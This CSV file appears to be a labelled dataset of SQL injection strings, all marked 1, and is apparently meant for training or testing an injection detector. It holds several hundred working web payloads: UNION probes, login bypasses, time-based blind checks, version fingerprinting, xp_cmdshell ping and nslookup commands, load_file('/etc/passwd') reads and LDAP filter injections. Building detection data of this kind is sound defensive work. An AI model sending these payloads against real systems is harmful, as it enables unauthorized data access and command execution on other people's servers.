payload,label
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'--,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'#,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1
-',1
 ',1
&',1
^',1
*',1
 or ''-',1
 or '' ',1
 or ''&',1
 or ''^',1
 or ''*',1
-,1
""" """,1
&,1
^,1
*,1
" or ""-",1
" or "" ",1
" or ""&",1
" or ""^",1
" or ""*",1
or true--,1
" or true--
' or true--
) or true--",1
) or true--,1
 or 'x'='x,1
) or ('x')=('x,1
)) or (('x'))=(('x,1
" or x""=""x",1
") or (x"")=(""x",1
")) or ((x""))=((""x",1
or 1=1,1
or 1=1--,1
or 1=1#,1
or 1=1/*,1
admin' --,1
admin' #,1
admin'/*,1
admin' or '1'='1,1
admin' or '1'='1'--,1
admin' or '1'='1'#,1
admin' or '1'='1'/*,1
admin'or 1=1 or ''=',1
admin' or 1=1,1
admin' or 1=1--,1
admin' or 1=1#,1
admin' or 1=1/*,1
admin') or ('1'='1,1
admin') or ('1'='1'--,1
admin') or ('1'='1'#,1
admin') or ('1'='1'/*,1
admin') or '1'='1,1
admin') or '1'='1'--,1
admin') or '1'='1'#,1
admin') or '1'='1'/*,1
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"admin"" --",1
"admin"" #",1
"admin""/*",1
"admin"" or ""1""=""1",1
"admin"" or ""1""=""1""--",1
"admin"" or ""1""=""1""#",1
"admin"" or ""1""=""1""/*",1
"admin""or 1=1 or """"=""",1
"admin"" or 1=1",1
"admin"" or 1=1--",1
"admin"" or 1=1#",1
"admin"" or 1=1/*",1
"admin"") or (""1""=""1",1
"admin"") or (""1""=""1""--",1
"admin"") or (""1""=""1""#",1
"admin"") or (""1""=""1""/*",1
"admin"") or ""1""=""1",1
"admin"") or ""1""=""1""--",1
"admin"") or ""1""=""1""#",1
"admin"") or ""1""=""1""/*",1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
sleep(__TIME__)#,1
1 or sleep(__TIME__)#,1
" or sleep(__TIME__)#
' or sleep(__TIME__)#
 or sleep(__TIME__)=""",1
 or sleep(__TIME__)=',1
1) or sleep(__TIME__)#,1
) or sleep(__TIME__)=,1
) or sleep(__TIME__)=',1
1)) or sleep(__TIME__)#,1
)) or sleep(__TIME__)=,1
)) or sleep(__TIME__)=',1
;waitfor delay '0:0:__TIME__'--,1
);waitfor delay '0:0:__TIME__'--,1
;waitfor delay '0:0:__TIME__'--,1
";waitfor delay '0:0:__TIME__'--
');waitfor delay '0:0:__TIME__'--
);waitfor delay '0:0:__TIME__'--",1
));waitfor delay '0:0:__TIME__'--,1
));waitfor delay '0:0:__TIME__'--,1
"));waitfor delay '0:0:__TIME__'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
 or benchmark(10000000,MD5(1))#",1
" or benchmark(10000000,MD5(1))#",1
"1) or benchmark(10000000,MD5(1))#",1
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
)) or benchmark(10000000,MD5(1))#",1
")) or benchmark(10000000,MD5(1))#",1
OR 1=1,1
OR 1=0,1
OR x=x,1
OR x=y,1
OR 1=1#,1
OR 1=0#,1
OR x=x#,1
OR x=y#,1
OR 1=1--,1
OR 1=0--,1
OR x=x--,1
OR x=y--,1
OR 3409=3409 AND ('pytW' LIKE 'pytW,1
OR 3409=3409 AND ('pytW' LIKE 'pytY,1
HAVING 1=1,1
HAVING 1=0,1
HAVING 1=1#,1
HAVING 1=0#,1
HAVING 1=1--,1
HAVING 1=0--,1
AND 1=1,1
AND 1=0,1
AND 1=1--,1
AND 1=0--,1
AND 1=1#,1
AND 1=0#,1
AND 1=1 AND '%'=',1
AND 1=0 AND '%'=',1
AND 1083=1083 AND (1427=1427,1
AND 7506=9091 AND (5913=5913,1
AND 1083=1083 AND ('1427=1427,1
AND 7506=9091 AND ('5913=5913,1
AND 7300=7300 AND 'pKlZ'='pKlZ,1
AND 7300=7300 AND 'pKlZ'='pKlY,1
AND 7300=7300 AND ('pKlZ'='pKlZ,1
AND 7300=7300 AND ('pKlZ'='pKlY,1
AS INJECTX WHERE 1=1 AND 1=1,1
AS INJECTX WHERE 1=1 AND 1=0,1
AS INJECTX WHERE 1=1 AND 1=1#,1
AS INJECTX WHERE 1=1 AND 1=0#,1
AS INJECTX WHERE 1=1 AND 1=1--,1
AS INJECTX WHERE 1=1 AND 1=0--,1
WHERE 1=1 AND 1=1,1
WHERE 1=1 AND 1=0,1
WHERE 1=1 AND 1=1#,1
WHERE 1=1 AND 1=0#,1
WHERE 1=1 AND 1=1--,1
WHERE 1=1 AND 1=0--,1
ORDER BY 1--,1
ORDER BY 2--,1
ORDER BY 3--,1
ORDER BY 4--,1
ORDER BY 5--,1
ORDER BY 6--,1
ORDER BY 7--,1
ORDER BY 8--,1
ORDER BY 9--,1
ORDER BY 10--,1
ORDER BY 11--,1
ORDER BY 12--,1
ORDER BY 13--,1
ORDER BY 14--,1
ORDER BY 15--,1
ORDER BY 16--,1
ORDER BY 17--,1
ORDER BY 18--,1
ORDER BY 19--,1
ORDER BY 20--,1
ORDER BY 21--,1
ORDER BY 22--,1
ORDER BY 23--,1
ORDER BY 24--,1
ORDER BY 25--,1
ORDER BY 26--,1
ORDER BY 27--,1
ORDER BY 28--,1
ORDER BY 29--,1
ORDER BY 30--,1
ORDER BY 31337--,1
ORDER BY 1#,1
ORDER BY 2#,1
ORDER BY 3#,1
ORDER BY 4#,1
ORDER BY 5#,1
ORDER BY 6#,1
ORDER BY 7#,1
ORDER BY 8#,1
ORDER BY 9#,1
ORDER BY 10#,1
ORDER BY 11#,1
ORDER BY 12#,1
ORDER BY 13#,1
ORDER BY 14#,1
ORDER BY 15#,1
ORDER BY 16#,1
ORDER BY 17#,1
ORDER BY 18#,1
ORDER BY 19#,1
ORDER BY 20#,1
ORDER BY 21#,1
ORDER BY 22#,1
ORDER BY 23#,1
ORDER BY 24#,1
ORDER BY 25#,1
ORDER BY 26#,1
ORDER BY 27#,1
ORDER BY 28#,1
ORDER BY 29#,1
ORDER BY 30#,1
ORDER BY 31337#,1
ORDER BY 1,1
ORDER BY 2,1
ORDER BY 3,1
ORDER BY 4,1
ORDER BY 5,1
ORDER BY 6,1
ORDER BY 7,1
ORDER BY 8,1
ORDER BY 9,1
ORDER BY 10,1
ORDER BY 11,1
ORDER BY 12,1
ORDER BY 13,1
ORDER BY 14,1
ORDER BY 15,1
ORDER BY 16,1
ORDER BY 17,1
ORDER BY 18,1
ORDER BY 19,1
ORDER BY 20,1
ORDER BY 21,1
ORDER BY 22,1
ORDER BY 23,1
ORDER BY 24,1
ORDER BY 25,1
ORDER BY 26,1
ORDER BY 27,1
ORDER BY 28,1
ORDER BY 29,1
ORDER BY 30,1
ORDER BY 31337,1
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
%' AND 8310=8310 AND '%'=',1
%' AND 8310=8311 AND '%'=',1
"and (select substring(@@version,1,1))='X'",1
"and (select substring(@@version,1,1))='M'",1
"and (select substring(@@version,2,1))='i'",1
"and (select substring(@@version,2,1))='y'",1
"and (select substring(@@version,3,1))='c'",1
"and (select substring(@@version,3,1))='S'",1
"and (select substring(@@version,3,1))='X'",1
)%20or%20('x'='x,1
%20or%201=1,1
; execute immediate 'sel' || 'ect us' || 'er',1
"benchmark(10000000,MD5(1))#",1
""";waitfor delay '0:0:__TIME__'--",1
1) or pg_sleep(__TIME__)--,1
"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1
"hi"""""""") or (""""""""a""""""""=""""""""a""""""",1
delete,1
like,1
""" or sleep(__TIME__)#",1
pg_sleep(__TIME__)--,1
*(|(objectclass=*)),1
declare @q nvarchar (200) 0x730065006c00650063 ...,1
 or 0=0 #,1
1) or sleep(__TIME__)#,1
) or ('a'='a,1
; exec xp_regread,1
@var select @var as var into temp end --,1
"1)) or benchmark(10000000,MD5(1))#",1
(||6),1
"a"""""""" or 3=3--""""""",1
""" or benchmark(10000000,MD5(1))#",1
# from wapiti,1
 or 0=0 --,1
1 waitfor delay '0:0:10'--,1
 or 'a'='a,1
"hi or 1=1 --""",1
or a = a,1
 UNION ALL SELECT,1
) or sleep(__TIME__)=',1
")) or benchmark(10000000,MD5(1))#",1
hi' or 'a'='a,1
%,1
limit,1
 or 1=1,1
 or 2 > 1,1
""")) or benchmark(10000000,MD5(1))#",1
hi') or ('a'='a,1
 or 3=3,1
));waitfor delay '0:0:__TIME__'--,1
a' waitfor delay '0:0:10'--,1
"1;(load_file(char(47,101,116,99,47,112,97,115, ...",1
or%201=1,1
1 or sleep(__TIME__)#,1
or 1=1,1
 and 1 in (select var from temp)--,1
 or '7659'='7659,1
 or 'text' = n'text',1
--,1
 or 1=1 or ''=',1
declare @s varchar (200) select @s = 0x73656c6 ...,1
exec xp,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
" or pg_sleep(__TIME__)--""",1
x' AND email IS NULL; --,1
admin' or ',1
 or 'unusual' = 'unusual',1
"1) or benchmark(10000000,MD5(1))#",1
\x27UNION SELECT,1
declare @s varchar(200) select @s = 0x77616974 ...,1
tz_offset,1
sqlvuln,1
"""));waitfor delay '0:0:__TIME__'--",1
||6,1
or%201=1 --,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
or a=a,1
) union select * from information_schema.tables;,1
PRINT @@variable,1
or isNULL(1/0) /*,1
26 %,1
"or """"a""""=""""a""",1
(sqlvuln),1
x' AND members.email IS NULL; --,1
or 1=1--,1
"and 1=( if((load_file(char(110,46,101,120,11 ...",1
0x770061006900740066006F0072002000640065006C00 ...,1
%20'sleep%2050',1
1)) or pg_sleep(__TIME__)--,1
/**/or/**/1/**/=/**/1,1
union all select @@version--,1
",@variable",1
(sqlattempt2),1
or (EXISTS),1
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
%20$(sleep%2050),1
"1 or benchmark(10000000,MD5(1))#",1
%20or%20''=',1
||UTL_HTTP.REQUEST,1
or pg_sleep(__TIME__)--,1
hi' or 'x'='x';,1
) or sleep(__TIME__)=,1
or 'whatever' in ('whatever'),1
; begin declare @var varchar(8000) set @var=' ...,1
"union select 1,load_file('/etc/passwd'),1,1,1;",1
0x77616974666F722064656C61792027303A303A313027 ...,1
exec(@s),1
) or pg_sleep(__TIME__)--,1
union select,1
or sleep(__TIME__)#,1
select * from information_schema.tables--,1
a' or 1=1--,1
a' or 'a' = 'a,1
declare @s varchar(22) select @s =,1
or 2 between 1 and 3,1
or a=a--,1
or '1'='1,1
|,1
or sleep(__TIME__)=',1
or 1 --',1
"or 0=0 #""",1
having,1
a',1
 or isNULL(1/0) /*,1
declare @s varchar (8000) select @s = 0x73656c ...,1
â or 1=1 --,1
char%4039%41%2b%40SELECT,1
order by,1
bfilename,1
having 1=1--,1
") or benchmark(10000000,MD5(1))#",1
or username like char(37);,1
;waitfor delay '0:0:__TIME__'--,1
"or 1=1--""",1
x' AND userid IS NULL; --,1
*/*,1
or 'text' > 't',1
(select top 1,1
"or benchmark(10000000,MD5(1))#",1
);waitfor delay '0:0:__TIME__'--,1
-- &password=,1
group by userid having 1=1--,1
or ''=',1
; exec master..xp_cmdshell,1
%20or%20x=x,1
select,1
a' or 3=3--,1
")) or sleep(__TIME__)=""""""",1
0x730065006c0065006300740020004000400076006500 ...,1
hi' or 1=1 --,1
) or pg_sleep(__TIME__)--,1
%20or%20'x'='x,1
or 'something' = 'some'+'thing',1
exec sp,1
29 %,1
(,1
Ã½ or 1=1 --,1
1 or pg_sleep(__TIME__)--,1
0 or 1=1,1
) or (a=a,1
uni/**/on sel/**/ect,1
replace,1
%27%20or%201=1,1
)) or pg_sleep(__TIME__)--,1
%7C,1
x' AND 1=(SELECT COUNT(*) FROM tabname); --,1
&apos;%20OR,1
; or '1'='1',1
declare @q nvarchar (200) select @q = 0x770061 ...,1
1 or 1=1,1
; exec ('sel' + 'ect us' + 'er'),1
23 OR 1=1,1
/,1
anything' OR 'x'='x,1
declare @q nvarchar (4000) select @q =,1
or 0=0 --,1
desc,1
||'6,1
),1
1)) or sleep(__TIME__)#,1
or 0=0 #,1
select name from syscolumns where id = (sele ...,1
hi or a=a,1
*(|(mail=*)),1
password:*/=1--,1
distinct,1
);waitfor delay '0:0:__TIME__'--,1
to_timestamp_tz,1
") or benchmark(10000000,MD5(1))#""",1
%2A%28%7C%28mail%3D%2A%29%29,1
or 1=1 /*,1
)) or sleep(__TIME__)=',1
"or 1=1 or """"=",1
or 1 in (select @@version)--,1
union select * from users where login = char ...,1
x' or 1=1 or 'x'='y,1
â or 3=3 --,1
@variable,1
or '1'='1'--,1
"a"" or 1=1--",1
//*,1
%2A%7C,1
""" or 0=0 --",1
")) or pg_sleep(__TIME__)--""",1
or a = a,1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
 or 1=1,1
 or 1=1 --,1
x' OR full_name LIKE '%Bob%,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
%20or%20''=',1
%20or%20'x'='x,1
)%20or%20('x'='x,1
 or 0=0 --,1
 or 0=0 #,1
"or 0=0 #""",1
 or 1=1--,1
 or '1'='1'--,1
 or 1 --',1
or 1=1--,1
 or 1=1 or ''=',1
"or 1=1 or """"=",1
 or a=a--,1
or a=a,1
) or ('a'='a,1
hi' or 'x'='x';,1
or,1
procedure,1
 or username like '%,1
 or uname like '%,1
 or userid like '%,1
 or uid like '%,1
 or user like '%,1
; exec master..xp_cmdshell,1
; exec xp_regread,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
 UNION SELECT,1
 UNION ALL SELECT,1
 or (EXISTS),1
 (select top 1,1
||UTL_HTTP.REQUEST,1
1;SELECT%20*,1
"<>""'%;)(&+",1
%20or%201=1,1
sqlattempt1,1
 or ''=',1
 or 3=3,1
 or 3=3 --,1
sleep(5)#,1
1 or sleep(5)#,1
" or sleep(5)#
' or sleep(5)#
 or sleep(5)=""",1
 or sleep(5)=',1
1) or sleep(5)#,1
) or sleep(5)=,1
) or sleep(5)=',1
1)) or sleep(5)#,1
)) or sleep(5)=,1
)) or sleep(5)=',1
;waitfor delay '0:0:5'--,1
);waitfor delay '0:0:5'--,1
;waitfor delay '0:0:5'--,1
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--",1
));waitfor delay '0:0:5'--,1
));waitfor delay '0:0:5'--,1
));waitfor delay '0:0:5'--,1
"benchmark(10000000,MD5(1))#",1
"1 or benchmark(10000000,MD5(1))#",1
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
) or benchmark(10000000,MD5(1))#",1
") or benchmark(10000000,MD5(1))#",1
"1)) or benchmark(10000000,MD5(1))#",1
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#",1
pg_sleep(5)--,1
1 or pg_sleep(5)--,1
""" or pg_sleep(5)--",1
 or pg_sleep(5)--,1
1) or pg_sleep(5)--,1
""") or pg_sleep(5)--",1
) or pg_sleep(5)--,1
1)) or pg_sleep(5)--,1
""")) or pg_sleep(5)--",1
)) or pg_sleep(5)--,1
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,1
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,1
SLEEP(5)#,1
SLEEP(5)--,1
"SLEEP(5)=""",1
SLEEP(5)=',1
or SLEEP(5),1
or SLEEP(5)#,1
or SLEEP(5)--,1
"or SLEEP(5)=""",1
or SLEEP(5)=',1
waitfor delay '00:00:05',1
waitfor delay '00:00:05'--,1
waitfor delay '00:00:05'#,1
"benchmark(50000000,MD5(1))",1
"benchmark(50000000,MD5(1))--",1
"benchmark(50000000,MD5(1))#",1
"or benchmark(50000000,MD5(1))",1
"or benchmark(50000000,MD5(1))--",1
"or benchmark(50000000,MD5(1))#",1
pg_SLEEP(5),1
pg_SLEEP(5)--,1
pg_SLEEP(5)#,1
or pg_SLEEP(5),1
or pg_SLEEP(5)--,1
or pg_SLEEP(5)#,1
"\""",1
AnD SLEEP(5),1
AnD SLEEP(5)--,1
AnD SLEEP(5)#,1
&&SLEEP(5),1
&&SLEEP(5)--,1
&&SLEEP(5)#,1
 AnD SLEEP(5) ANd '1,1
&&SLEEP(5)&&'1,1
ORDER BY SLEEP(5),1
ORDER BY SLEEP(5)--,1
ORDER BY SLEEP(5)#,1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,1
RANDOMBLOB(500000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",1
<username>'--,1
RANDOMBLOB(1000000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",1
; --,1
; --,1
); --,1
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
 grant connect to name; grant resource to name; --,1
 or 1=1 --,1
 union (select @@version) --,1
" union (select NULL, (select @@version)) --",1
" union (select NULL, NULL, (select @@version)) --",1
" union (select NULL, NULL, NULL,  (select @@version)) --",1
